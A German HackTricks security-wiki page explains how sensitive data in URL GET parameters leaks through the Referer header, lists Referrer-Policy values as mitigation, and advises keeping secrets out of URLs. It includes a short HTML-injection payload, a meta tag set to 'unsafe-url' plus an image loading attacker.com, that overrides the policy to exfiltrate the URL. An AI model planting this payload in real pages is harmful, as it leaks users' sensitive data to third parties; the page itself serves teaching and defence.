{% hint style="success" %}
Lernen Sie & üben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & üben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}


# Referrer-Header und Richtlinie

Referrer ist der Header, den Browser verwenden, um anzuzeigen, welche die vorherige besuchte Seite war.

## Ausgetretene sensible Informationen

Wenn an irgendeinem Punkt innerhalb einer Webseite sensible Informationen in den GET-Anforderungsparametern gefunden werden, wenn die Seite Links zu externen Quellen enthält oder ein Angreifer in der Lage ist, den Benutzer dazu zu bringen/bitten (Social Engineering), eine URL zu besuchen, die vom Angreifer kontrolliert wird. Könnte er in der Lage sein, die sensiblen Informationen innerhalb der letzten GET-Anforderung zu exfiltrieren.

## Minderung

Sie können den Browser dazu bringen, einer **Referrer-Richtlinie** zu folgen, die **verhindern** könnte, dass die sensiblen Informationen an andere Webanwendungen gesendet werden:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Gegenmaßnahme

Sie können diese Regel mit einem HTML-Meta-Tag außer Kraft setzen (der Angreifer muss eine HTML-Injektion ausnutzen):
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verteidigung

Geben Sie niemals sensible Daten in GET-Parametern oder Pfaden in der URL an.
